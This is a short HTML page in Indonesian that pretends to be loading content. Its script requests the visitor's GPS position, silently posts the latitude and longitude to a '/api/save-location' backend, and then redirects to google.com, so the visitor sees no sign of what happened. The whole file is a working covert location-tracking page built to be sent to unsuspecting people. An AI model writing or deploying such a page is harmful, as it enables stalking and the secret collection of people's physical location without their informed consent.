<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Memuat Halaman...</title>
</head>
<body>
    <p style="text-align:center; margin-top:20%">Memuat konten, mohon tunggu...</p>
    <script>
        // Minta izin lokasi GPS browser
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Kirim koordinat ke backend API Vercel
                await fetch('/api/save-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat, lon })
                });

                // Alihkan ke tujuan setelah terkirim
                window.location.href = "https://google.com";
            }, () => {
                // Jika ditolak, tetap alihkan ke tujuan
                window.location.href = "https://google.com";
            });
        } else {
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
